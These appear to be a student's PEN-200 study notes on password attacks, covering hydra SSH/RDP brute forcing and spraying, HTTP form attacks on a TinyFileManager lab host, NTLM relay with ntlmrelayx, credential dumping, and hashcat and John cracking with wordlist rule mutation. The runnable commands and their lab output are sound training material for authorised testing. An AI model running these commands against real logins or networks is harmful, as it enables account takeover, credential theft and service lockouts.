  15. <h2>title: PEN-200 Module 15 — Password Attacks That Still Work
  16. created: 2023-09-29 14:54:25Z
  17. updated: 2023-10-06 01:04:40Z</h2>
  18. <h1>PEN-200 Module 15 — Password Attacks That Still Work</h1>
  19. <h2>TLDR;</h2>
  20. <p>Credential attacks blend automation with context. The lab notes captured wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.</p>
  21. <h3>Online Guessing</h3>
  22. <ul>
  23. <li>Build user lists from LDAP, email headers, and OSINT; normalise casing and remove duplicates.</li>
  24. <li>Respect lockout thresholds: throttle attempts (<code>hydra -t 4 -W 30</code>) and log timings.</li>
  25. </ul>
  26. <pre><code># SSH brute force with delays
  27. hydra -L users.txt -P rockyou.txt -s 22 -V -W 15 ssh://192.168.119.37
  28. ​
  29. # HTTP form spraying (Burp → Intruder capture first)
  30. ffuf -X POST -d &quot;username=FUZZ&amp;password=Winter2024!&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -w users.txt -u https://portal.acme.local/login -mr &quot;Welcome&quot;
  31. </code></pre>
  32. <ul>
  33. <li>Capture successes with timestamp, source IP, account type, and password reuse indicators.</li>
  34. </ul>
  35. <h3>Hash Capture &amp; Cracking</h3>
  36. <ul>
  37. <li>Dump credentials responsibly (<code>secretsdump.py</code>, <code>impacket</code> relays, DPAPI extraction). Store raw files in encrypted containers.</li>
  38. <li>Use targeted wordlists plus rules:</li>
  39. </ul>
  40. <pre><code class="language-bash">hashcat -m 1000 hashes/ntlm.txt wordlists/rockyou.txt -r rules/dive.rule --session ntlm
  41. hashcat -m 5600 hashes/netntlmv2.txt wordlists/top20k.txt -r rules/leetspeak.rule --status
  42. </code></pre>
  43. <ul>
  44. <li>Leverage masks (<code>?u?l?l?l?d?d?d</code>) for seasonal patterns. Document masks used and cracked credentials for reporting.</li>
  45. </ul>
  46. <h3>Relay &amp; Pass-The-Hash</h3>
  47. <ul>
  48. <li><strong>Responder / Inveigh</strong> to capture Net-NTLMv2.</li>
  49. <li><strong>ntlmrelayx.py</strong> to target SMB/HTTP services lacking signing or enforcing Extended Protection.</li>
  50. </ul>
  51. <pre><code class="language-bash">python3 ntlmrelayx.py -tf targets.txt -smb2support --escalate-user supportsvc
  52. </code></pre>
  53. <ul>
  54. <li>After success, enumerate new privileges (<code>net localgroup administrators</code>, <code>Get-ADGroupMember</code>). Note lateral movement paths you unlocked.</li>
  55. </ul>
  56. <h3>SSH Key &amp; Password Manager Workflows</h3>
  57. <ul>
  58. <li>Convert private keys: <code>ssh2john id_rsa &gt; ssh.hash</code>, crack with <code>john --wordlist=... --rules=KoreLogic</code>.</li>
  59. <li>For KeePass/Password Safe artifacts, use <code>keepass2john</code> and mention key-file requirements in the notes.</li>
  60. </ul>
  61. <h3>Operational Hygiene</h3>
  62. <ul>
  63. <li>Segregate cracked credentials by sensitivity (user, service, privileged) and update the engagement tracker.</li>
  64. <li>Purge loot post-engagement per policy; document deletion commands for audit.</li>
  65. </ul>
  66. <h3>Defensive Recommendations</h3>
  67. <ul>
  68. <li>Enforce MFA, disable legacy auth protocols, and deploy account lockout alerting.</li>
  69. <li>Rotate captured credentials immediately; note whether the client already has PAM or SSPR solutions to support this.</li>
  70. <li>Roll out LAPS / gMSA to prevent local admin password reuse.</li>
  71. </ul>
  72. <p>Module 15 proves passwords remain the weakest link—apply these workflows carefully, log everything, and hand defenders a prioritized remediation list.</p>
  73. <h2>Working Notes... In Graphic Detail...</h2>
  74. <h3>Password Attacks</h3>
  75. <ul>
  76. <li>Attacking network services logins.</li>
  77. <li>Password Cracking Fundamentals.</li>
  78. <li>Working with Password Hashes.</li>
  79. </ul>
  80. <h4>15.1 Attacking Network Services Logins</h4>
  81. <ul>
  82. <li>Attack SSH and RDP logins.</li>
  83. <li>Attack HTTP POST login forms.</li>
  84. </ul>
  85. <h5>SSH and RDP</h5>
  86. <ul>
  87. <li>Execute a Dictionary attack against SSH and RDP.</li>
  88. <li>Tool; THC Hydra.<ul>
  89. <li>Wordlist; <code>rockyou.txt</code></li>
  90. </ul>
  91. </li>
  92. <li>Contains 14M passwords.</li>
  93. </ul>
  94. <p>As an example we will brute our first test VM. We will attack ssh on port 2222 and attempt to determine the password for the user <code>george</code>.</p>
  95. <ul>
  96. <li>Confirm the target is running SSH on port 2222.</li>
  97. </ul>
  98. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  99. └─$ sudo nmap -sV -p 2222 192.168.241.201
  100. [sudo] password for operator:
  101. Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 09:12 PDT
  102. Nmap scan report for 192.168.241.201
  103. Host is up (0.079s latency).
  104. ​
  105. PORT STATE SERVICE VERSION
  106. 2222/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  107. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  108. ​
  109. Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  110. Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
  111. </code></pre>
  112. <ul>
  113. <li>The output indicates that SSH is open.</li>
  114. <li>Let&#39;s assume through information gathering we already discovered the <code>george</code> user.<ul>
  115. <li>*The format of the user name may suggest that the company uses the first name for account names. This information can assist us later to further our efforts.</li>
  116. </ul>
  117. </li>
  118. <li>Once we have prepared the <code>rockyou.txt</code> by decompressing it.<ul>
  119. <li>attack with a single username <code>-l george</code></li>
  120. <li>specify the port with <code>-s 2222</code></li>
  121. <li>set password list with <code>-P /usr/share/wordlists/rockyou.txt</code></li>
  122. <li>define target with <code>ssh://192.168.241.201</code></li>
  123. </ul>
  124. </li>
  125. </ul>
  126. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  127. └─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
  128. Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  129. ​
  130. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 09:34:36
  131. [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
  132. [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task

  135. 1 of 1 target successfully completed, 1 valid password found
  136. Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 09:34:46
  137. </code></pre>
  138. <ul>
  139. <li>We have successfully discovered a valid login for <code>george</code></li>
  140. <li>The dictionary attack worked because the password was contained in the <code>rockyou.txt</code> wordlist.</li>
  141. <li>If we don&#39;t have a valid username.</li>
  142. <li>We would use enumeration and information gathering techniques.</li>
  143. <li>We can also attack built in accounts.</li>
  144. <li>On Linux <code>root</code></li>
  145. <li>On Win <code>Administrator</code></li>
  146. </ul>
  147. <p>In the next example we will use the <strong>password spraying</strong> technique to use a single password against multiple usernames.
  148. *This technique is extremely viable due to the number of ways we can gain access to passwords. We may gain access to credentials using one of the techniques described later in this module, find the stored in plain text, or through online leak DBs. Services like ScatteredSecrets track password leaks, compromise, and sell plaintext passwords. This can be beneficial during a pentest, but we must assure we don&#39;t violate the ToS of these services and only use passwords in cooperation with the legal owner. Always review the service to determine if it is operating legally. As an example, WeLeakInfo was recently seized by the FBI and US DoJ for alleged illegal activity.</p>
  149. <ul>
  150. <li>We will demonstrate this by executing a password spray against out second test VM.</li>
  151. <li>Using <code>hydra</code></li>
  152. <li>Set the list of usernames <code>-L /usr/share/wordlists/dirb/others/names.txt</code></li>
  153. <li>Contains over 8000 usernames.</li>
  154. <li>Set single password <code>-p &quot;SuperS3cure1337#&quot;</code></li>
  155. <li>Using RDP proto <code>rdp://192.168.241.202</code></li>
  156. </ul>

  173. <ul>
  174. <li>In this case we discover two usernames with the password we discovered in the DB leak.</li>
  175. <li>This can reveal users with the same password across multiple systems.</li>
  176. <li>We should always try to leverage every password we discover by spraying them across target systems.</li>
  177. <li>Always use caution with broad-range attacks.</li>
  178. <li>Dict attacks generate a lot of noise.</li>
  179. <li>Huge amounts of traffic can bring down a network.</li>
  180. <li>Basic brute force protection programs can lock user accounts after 3 attempts.</li>
  181. <li>Possibly locking users out of critical production systems IRL pentest.</li>
  182. </ul>

  310. <h5>HTTP POST Login Form</h5>
  311. <p>During most assessments we will face a web service, often requiring login before we can interact. If this is the only present vector and default creds fail, we should consider a dict attack.</p>
  312. <p>Most web services have a default user account, i.e. <code>admin</code>, which we can use in the dict attack to increase our odds of success while also reducing attack duration.</p>
  313. <p>In this example, we will perform a dict attack on the login form of a TinyFileManager app.</p>
  314. <ul>
  315. <li>Start with the app docs.</li>
  316. <li>TinyFileManager.</li>
  317. <li>Includes 2 def user accounts.
  318. - <code>admin</code>
  319. - <code>user</code></li>
  320. <li>We will target <code>user</code> with the <code>rockyou.txt</code> wordlist using <code>hydra</code></li>
  321. <li>To target HTTP POST with Hydra we need 2 pieces of info.</li>
  322. <li>The POST data.</li>
  323. <li>Containing the request body which specifies username and password.<ul>
  324. <li>We must also capture a failed login attempt so Hydra can differentiate between successful and failed login attempts.</li>
  325. </ul>
  326. </li>
  327. <li>Use Burp to intercept a login attempt.</li>
  328. <li>Record the request body in the POST data.</li>
  329. </ul>
  330. <pre><code class="language-http">POST / HTTP/1.1
  331. Host: 192.168.241.201
  332. Content-Length: 23
  333. Cache-Control: max-age=0
  334. Upgrade-Insecure-Requests: 1
  335. Origin: http://192.168.241.201
  336. Content-Type: application/x-www-form-urlencoded
  337. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
  338. Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  339. Referer: http://192.168.241.201/
  340. Accept-Encoding: gzip, deflate
  341. Accept-Language: en-US,en;q=0.9
  342. Cookie: filemanager=u1k19t8td1q7fsbpmjjb91g6a5
  343. Connection: close
  344. ​
  345. fm_usr=test&amp;fm_pwd=test
  346. </code></pre>
  347. <ul>
  348. <li>POST data.<ul>
  349. <li><code>fm_usr=test&amp;fm_pwd=test</code></li>
  350. </ul>
  351. </li>
  352. <li>We find a text string that appears in a failed login attempt GET.<ul>
  353. <li><code>Login failed. Invalid username or password</code></li>
  354. </ul>
  355. </li>
  356. <li><em>In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is out of the scope of this Module.</em>.</li>
  357. <li>Now we can set the options of our Hydra attack.</li>
  358. <li>Set user <code>-l</code></li>
  359. <li>Set wordlist <code>-P</code></li>
  360. <li>Set target IP without protocol.<ul>
  361. <li>POST form arg <code>http-post-form</code></li>
  362. </ul>
  363. </li>
  364. <li>Accepts 3 colon-delimited fields.
  365. - Location of login form <code>index.php</code></li>
  366. <li>Request body providing username and password.</li>
  367. <li>Failed login identifier aka the <strong>condition string</strong>.
  368. - The condition string is searched for in the response.
  369. - Try to avoid keywords like <code>password</code> or <code>username</code><ul>
  370. <li>Modify the condition string as needed.</li>
  371. </ul>
  372. </li>
  373. <li>Launch our Hydra attack.</li>
  374. </ul>
  375. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  376. └─$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.241.201 http-post-form &quot;/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;
  377. Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  378. ​
  379. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 18:34:55
  380. [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
  381. [DATA] attacking http-post-form://192.168.241.201:80/index.php:fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid
  382. [STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 16 active
  383. [80][http-post-form] host: 192.168.241.201 login: user password: 121212
  384. 1 of 1 target successfully completed, 1 valid password found
  385. Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 18:37:21
  386. </code></pre>
  387. <ul>
  388. <li>Our attack was succesful.</li>
  389. <li>Password of <code>user</code> is <code>121212</code></li>
  390. <li>We can confirm by logging in.</li>
  391. <li>Always be aware <em>dict attacks make a lot of noise!</em>.</li>
  392. <li>If present, a WAF would block.</li>
  393. <li>Other brute force mitigations would as well.</li>
  394. <li>Fail2ban.<ul>
  395. <li>This is a highly effective vector, as web apps are no often protected with such measures.</li>
  396. </ul>
  397. </li>
  398. </ul>
  399. <p>Dict attacks can be highly effective if we begin with known info and take possible countermeasures into consideration.</p>

  436. <h4>15.2 Password Cracking Fundamentals</h4>
  437. <ul>
  438. <li>Understand the fundamentals of password cracking.</li>
  439. <li>Mutate wordlists.</li>
  440. <li>Explain the basic password cracking methodology.</li>
  441. <li>Attack password manager key files.</li>
  442. <li>Attack the passphrase of SSH private keys.</li>
  443. </ul>
  444. <h5>Introduction to Encryption, Hashes and Cracking</h5>
  445. <p>We will examine the difference between encryption and hash algorithms as well as discuss password cracking. We will review two popular password cracking tools:</p>
  446. <ul>
  447. <li><a href="https://hashcat.net/hashcat/">Hashcat</a></li>
  448. <li><a href="https://www.openwall.com/john/">John the Ripper (JtR)</a>
  449. Finally we will calculate the time it takes to crack specific hashes!</li>
  450. </ul>
  451. <p><strong>Encryption</strong> is a two-way function. Data is scrambled, i.e. encrypted, and unscrambled, i.e. decrypted with at least one key. The encrypted data is known as <a href="https://en.wikipedia.org/wiki/Ciphertext">ciphertext</a></p>
  452. <ul>
  453. <li><a href="https://en.wikipedia.org/wiki/Symmetric-key_algorithm">Symmetric Encryption</a></li>
  454. <li>Use the same key for enc and dec.</li>
  455. <li>To send a message to another person both sides need to know the key (password)</li>
  456. <li>If the key is sent via unsecure channel, it can be intercepted.</li>
  457. <li>In this case, the attacker can use a MitM attack to access the encrypted message between the two.</li>
  458. <li>With an intercepted key and access to the encrypted message the attacker can decrypt and read.</li>
  459. <li>This introduces risk as the comm sec is reliant on knowledge of the key, which must be known by both sides before starting the comm.
  460. - An example is <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">AES (Advanced Encryption Standard)</a></li>
  461. <li><a href="https://en.wikipedia.org/wiki/Public-key_cryptography">Asymmetric Encryption</a></li>
  462. <li>Uses distinct key pairs.</li>
  463. <li>Private and public key.</li>
  464. <li>To recieve a message the user shares their pub key with the comm partner.</li>
  465. <li>The pub key is used for the comm partner to enc their message to the user.</li>
  466. <li>Only the corresponding priv key can dec the message.
  467. - An example is <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA (Rivest-Shamir-Adleman)</a></li>
  468. </ul>
  469. <p><strong>Hash</strong>, or a digest, is the result of running var sized input data, such as a plaintext password, through a hash algorithm.</p>
  470. <ul>
  471. <li><a href="https://en.wikipedia.org/wiki/SHA-1">SHA1</a></li>
  472. <li><a href="https://en.wikipedia.org/wiki/MD5">MD5</a>
  473. The result is a fixed-len hexadecimal value which represents the original plaintext input. Plaintext run through the same hash algo always produces the same hash, which is statistically unique. The only exception being an extremely rare <a href="https://en.wikipedia.org/wiki/Hash_collision">hash collision</a>, where two input values result in the same hash value.</li>
  474. </ul>
  475. <p>The majority of common hash algos, i.e. SHA1 and MD5, are cryptographic hash functions. They are <a href="https://en.wikipedia.org/wiki/One-way_function">one-way finctions</a>, trivial to generate but prohibitively difficult to reverse to plaintext from the hash. We will focus on cryptographic hash functions primarily.</p>
  476. <p>Hashing is leveraged in infosec. When a user registers an account and sets a password, the password is typically hashed and stored in a DB. This prevents the site admin (or an attacker) from accessing the plaintext password.</p>
  477. <p>During login, the supplied password is hashed and compared to the hash in the DB. If the match, the password is correct.</p>
  478. <p>App and user passwords are more often than not encrypted or hashed for protection. To dec an enc password we need to determine the key used to enc. To determine the plaintext of a hash we must run plaintext passwords through the hash algo and compare the returned hash to the target hash. <strong>Password cracking</strong> attacks are typically performed on a dedicated system, it is time consuming and should run in parralell with other actions during a pentest.</p>
  479. <p>Unlike dict attacks, password cracking is quiet, doesn not lock accounts by failed attempts, and is unaffected by countermeasures.</p>
  480. <p>Example, if we gain access to a <a href="https://en.wikipedia.org/wiki/SHA-2">SHA-256</a> password hash with value:</p>
  481. <pre><code>5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6
  482. </code></pre>
  483. <p>We can use <code>sha256sum</code> to hash password attempts and compare the results. If we hash <code>secret</code> twice and <code>secret1</code>, using <code>echo -n</code> to strip the newline (which would be added to the string, modifying the hash) we can see that the two <code>secret</code> hashes are the same. The <code>secret1</code> hash is completely different, despite the similar input, showing us that plaintext <code>secret1</code> is not associated with the first hash.</p>
  484. <pre><code class="language-bash">kali@kali:~$ echo -n &quot;secret&quot; | sha256sum
  485. 2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b -
  486. ​
  487. kali@kali:~$ echo -n &quot;secret&quot; | sha256sum
  488. 2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b -
  489. ​
  490. kali@kali:~$ echo -n &quot;secret1&quot; | sha256sum
  491. 5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6 -
  492. </code></pre>
  493. <p>This is sufficient for us to understand the process, but unwieldy in execution. There are tools available to us for streamlining the process, two of the most popular are:</p>
  494. <ul>
  495. <li>Hashcat.</li>
  496. <li>Mainly GPU based tool.</li>
  497. <li>Requires.
  498. - <a href="https://en.wikipedia.org/wiki/OpenCL">OpenCL</a>
  499. - <a href="https://developer.nvidia.com/cuda-toolkit">CUDA</a></li>
  500. <li>Also supports CPU.</li>
  501. <li>JtR.</li>
  502. <li>CPU based tool.</li>
  503. <li>Also supports GPU.
  504. GPU cracking is much faster than CPU, since GPUs contain thousands of cores to distribute the workload. Note that some slow hash algos, like <a href="https://en.wikipedia.org/wiki/Bcrypt">bcrypt</a>, work better on CPU. Both tools are important to learn, they support different algos.</li>
  505. </ul>
  506. <p>Before we begin, we can calculate the cracking time of various hashes by dividing the <a href="https://www.hypr.com/security-encyclopedia/key-space">keyspace</a> with the hash rate. The keyspace consists of the char set to the power of the len of the plaintext input.</p>
  507. <ul>
  508. <li>Keyspace example.</li>
  509. <li>Lower-case latin: 26 chars.</li>
  510. <li>Upper-case latin: 26 chars.</li>
  511. <li>Numbers 0-9: 10 chars.</li>
  512. <li>Result 62 variations for each plaintext char.</li>
  513. <li>A 5 char password = 62^5 possible passwords.</li>
  514. <li>916132832 possibilities.</li>
  515. </ul>
  516. <pre><code class="language-bash">kali@kali:~$ echo -n &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot; | wc -c
  517. 62
  518. ​
  519. kali@kali:~$ python3 -c &quot;print(62**5)&quot;
  520. 916132832
  521. </code></pre>
  522. <ul>
  523. <li>Hashrate example.</li>
  524. <li>How many calculations per second.</li>
  525. <li>We can find this with Hashcats benchmark mode.</li>
  526. <li>We will concentrate on MD5, SHA1, SHA-256 for this example.</li>
  527. </ul>

  644. <h5>Mutating Wordlists</h5>
  645. <p>Strong password policies dictating min len, char derivations, special chars, and num vals have become prevalent in recent years. Most passwords found in common word lists will not suffice. When attacking a target with strong policy we need to prepare the wordlist for such situations. Once option is to mutate the passwords.</p>
  646. <ul>
  647. <li><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">rule-based attack</a></li>
  648. <li>Individual rules are implemented through rule functions.</li>
  649. <li>Modify existing passwords contained in the wordlist.</li>
  650. <li>An individual rule consists of one or more rule functions.</li>
  651. <li>Multiple rule functions will often be used in each rule.</li>
  652. <li>To leverage we must craft a rule file.</li>
  653. <li>Supplied to cracking tool.</li>
  654. <li>Basic example.</li>
  655. <li>Rule function that appends fixed chars to all passwords in a word list.</li>
  656. <li>Modifies various chars.</li>
  657. </ul>
  658. <p><em>Note that is does increase the size of wordlists dramatically, good cracking hardware is important, most can handle passwords with less than 8 chars easily.</em></p>
  659. <p>For this example:</p>
  660. <ul>
  661. <li>Password policy.</li>
  662. <li>Upper case letter.</li>
  663. <li>Special char.</li>
  664. <li>Num val.</li>
  665. <li>We can check the first 10 passwords of <code>rockyou.txt</code> to determine if they fit this requirement.</li>
  666. </ul>
  667. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  668. └─$ head /usr/share/wordlists/rockyou.txt
  669. 123456
  670. 12345
  671. 123456789
  672. password
  673. iloveyou
  674. princess
  675. 1234567
  676. rockyou
  677. 12345678
  678. abc123
  679. </code></pre>
  680. <ul>
  681. <li><p>None of the first 10 passwords comply to the policy.</p>
  682. </li>
  683. <li><p>We could use a rule function to mutate the passwords to fit the policy, but first we will familiarize with rule functions and how to use them on a basic example before applying to a complex wordlist.</p>
  684. </li>
  685. <li><p>Copy the first 10 passwords of <code>rockyou.txt</code> to <code>demo.txt</code></p>
  686. </li>
  687. <li><p>Remove all number sequences which don&#39;t fit the password policy.</p>
  688. </li>
  689. <li><p>Use <code>sed</code></p>
  690. </li>
  691. <li><p>Edit in place <code>-i</code></p>
  692. </li>
  693. <li><p>Lines starting with 1 <code>^1</code></p>
  694. </li>
  695. <li><p>Delete with <code>d</code></p>
  696. </li>
  697. </ul>
  698. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  699. └─$ head /usr/share/wordlists/rockyou.txt &gt; demo.txt
  701. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  702. └─$ sed -i &#39;/^1/d&#39; demo.txt
  704. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  705. └─$ cat demo.txt
  706. password
  707. iloveyou
  708. princess
  709. rockyou
  710. abc123
  711. </code></pre>
  712. <ul>
  713. <li>We now have 5 passwords that we will mutate to fit the policy.</li>
  714. <li><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat Wiki</a></li>
  715. <li>List of all rule functions with examples.</li>
  716. <li>If we want to add a char.</li>
  717. <li><code>$</code> function appends.</li>
  718. <li><code>^</code> function prepends.</li>
  719. <li>Both expect on char after the function.</li>
  720. <li>Example, prepend 3 to every password in a file.
  721. - The rule function is <code>^3</code></li>
  722. <li>When generating a password with a num val, many users simple at 1 to the end.</li>
  723. <li>Therefore we will use rule function <code>$1</code> .</li>
  724. <li>Create <code>demo.rule</code> with this function.</li>
  725. <li>Escape the special char <code>$</code> to echo it correctly.</li>
  726. </ul>
  727. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  728. └─$ echo \$1 &gt; demo.rule
  729. </code></pre>
  730. <ul>
  731. <li>Now we can use Hascat with our wordlist mutation.</li>
  732. <li>Provide rule file with <code>-r</code></li>
  733. <li>And <code>--stdout</code> to display mutated passwords in debug mode.</li>
  734. </ul>
  735. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  736. └─$ hashcat -r demo.rule --stdout demo.txt
  737. password1
  738. iloveyou1
  739. princess1
  740. rockyou1
  741. abc1231
  742. </code></pre>
  743. <ul>
  744. <li>Now for the uppercase char policy req.</li>
  745. <li>When forced to use and upper case, many users capitalize the first letter.</li>
  746. <li>Therefore we will use the <code>c</code> rule function to cap the first char and convert the rest to lower.</li>
  747. <li>When using multiple rules.</li>
  748. <li>If rules are on the same line sep by space.</li>
  749. <li>Hashcat uses them consecutively on each password.
  750. - Resulting in cap first char and 1 appended.</li>
  751. <li>If rules are on sep lines.</li>
  752. <li>Hashcat will use each rule separately.
  753. - Resulting in two mutated passwords for each password in the list.</li>
  754. </ul>
  755. <pre><code class="language-bash">kali@kali:~/passwordattacks$ cat demo1.rule
  756. $1 c
  758. kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
  759. Password1
  760. Iloveyou1
  761. Princess1
  762. Rockyou1
  763. Abc1231
  764. ​
  765. kali@kali:~/passwordattacks$ cat demo2.rule
  766. $1
  767. c
  768. ​
  769. kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
  770. password1
  771. Password
  772. iloveyou1
  773. Iloveyou
  774. princess1
  775. Princess
  776. ...
  777. </code></pre>
  778. <ul>
  779. <li>Now to add the special char.</li>
  780. <li>We will start with <code>!</code>, a common special char.</li>
  781. <li>Therefore we will add <code>$1</code> to our rule file.</li>
  782. </ul>
  783. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  784. └─$ echo \$1 c \$! &gt; demo1.rule
  786. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  787. └─$ cat demo1.rule
  788. $1 c $!
  789. </code></pre>
  790. <ul>
  791. <li>We will make two rule file variations.</li>
  792. </ul>
  793. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  794. └─$ echo \$1 c \$! &gt; demo1.rule
  796. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  797. └─$ cat demo1.rule
  798. $1 c $!
  800. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  801. └─$ echo \$! \$1 c &gt; demo2.rule
  802. ​
  803. ​
  804. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  805. └─$ cat demo2.rule
  806. $! $1 c
  807. ​
  808. ​
  809. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  810. └─$ hashcat -r demo1.rule --stdout demo.txt
  811. Password1!
  812. Iloveyou1!
  813. Princess1!
  814. Rockyou1!
  815. Abc1231!

  833. <ul>
  834. <li>We will use <code>rockyout.txt</code></li>

  838. <li>Special char.</li>

  903. <p><strong>When attempting to create rules</strong> to mutate and existing wordlist:</p>
  904. <ul>
  905. <li>Always consider human behavior and convenience regarding passwords.</li>
  906. <li>Most users, use a main word and modify it to fit a policy.</li>
  907. <li>Often appending numbers and special chars.</li>
  908. <li>When an upper case is req, most user cap the first char.</li>
  909. <li>When a special char is req, most users append it to the end.</li>
  910. <li>Often relying on chars on the left side of the keyboard as they are easy to reach and type.</li>
  911. </ul>
  912. <p>Instead of creating rules ourselves, we can also use rules provided by Hashcat and other sources. Hashcat includes a variety of rules in <code>/usr/share/hashcat/rules</code>.</p>
  913. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]

  930. <ul>
  931. <li>The cover a wide range of mutations.</li>
  932. <li>Most useful when we don&#39;t know the target&#39;s password policy.</li>
  933. <li>We will use predefined rules in upcoming examples.</li>
  934. <li>It&#39;s always most efficient to gain information about the target password policy or find typically used default policies for the target software env.</li>
  935. </ul>

  1097. <h5>Cracking Methodology</h5>
  1098. <p>The process of cracking a has is described in the following steps:</p>
  1099. <ul>
  1100. <li><p>Extract hashes.</p>
  1101. </li>
  1102. <li><p>Format hashes.</p>
  1103. </li>
  1104. <li><p>Calculate the cracking time.</p>
  1105. </li>
  1106. <li><p>Prepare wordlist.</p>
  1107. </li>
  1108. <li><p>Attack the hash.</p>
  1109. </li>
  1110. <li><p><strong>Extract hashes</strong>.</p>
  1111. </li>
  1112. <li><p>In a pentest you will find hashes in various locations.</p>
  1113. </li>
  1114. <li><p>A DB dump for instance.</p>
  1115. </li>
  1116. <li><p><strong>Format hashes</strong> into the tools expected cracking format.</p>
  1117. </li>
  1118. <li><p>To do this we need to know the algo used to create the hash.</p>
  1119. </li>
  1120. <li><p>We can ID the hash type with.
  1121. - <a href="https://www.kali.org/tools/hash-identifier/">hash-identifier</a>
  1122. - <a href="https://www.kali.org/tools/hashid/">hashid</a></p>
  1123. </li>
  1124. <li><p>Both installed on Kali by default.</p>
  1125. </li>
  1126. <li><p>Depending on the hash algo and source of the hash.</p>
  1127. </li>
  1128. <li><p>Check if it is already in the correct format for our cracking tool.</p>
  1129. </li>
  1130. <li><p>If not, we must use helper tools to change the representation of the hash into the expected format.</p>
  1131. </li>
  1132. <li><p><strong>Calculate cracking time</strong>.</p>
  1133. </li>
  1134. <li><p>Determine the feasibility of our cracking attempt.</p>
  1135. </li>
  1136. <li><p>As discussed.
  1137. - <code>keyspace / hashrate</code></p>
  1138. </li>
  1139. <li><p>If the cracking time exceeds our expected lifetime, we may have to reconsider our approach.</p>
  1140. </li>
  1141. <li><p>Realistically, consider the duration of the current engagement and the resources we have to run our cracking attempts.</p>
  1142. </li>
  1143. <li><p>Cloud based GPU for instance.</p>
  1144. </li>
  1145. <li><p><strong>Wordlist preparation</strong>.</p>
  1146. </li>
  1147. <li><p>In almost every case we should mutate our wordlist and perform a rule based attack.</p>
  1148. </li>
  1149. <li><p>Investigate potential password policies and research other vectors.</p>
  1150. </li>
  1151. <li><p>Including online password leaks.</p>
  1152. </li>
  1153. <li><p>Without this, we may need to run multiple wordlists with/without pre-existing rules to broaden coverage of possible passwords.</p>
  1154. </li>
  1155. <li><p><strong>Attack the hash</strong>.</p>
  1156. </li>
  1157. <li><p>Take special care when copy-pasta our hashes.</p>
  1158. </li>
  1159. <li><p>A space or a newline can derail our efforts.</p>
  1160. </li>
  1161. <li><p>We must be sure of the hash type.</p>
  1162. </li>
  1163. <li><p>For instance, hashid cannot differentiate between MD2, MD4, or MD5.</p>
  1164. </li>
  1165. <li><p>An incorrect choice will waste time.</p>
  1166. </li>
  1167. <li><p>Avoid this by double checking results with other tools.</p>
  1168. </li>
  1169. <li><p>Do additional research to confirm.</p>
  1170. </li>
  1171. </ul>
  1172. <p>The best way to improve our results is to operate with focus and structure.</p>

  1226. <h5>Password Manager</h5>
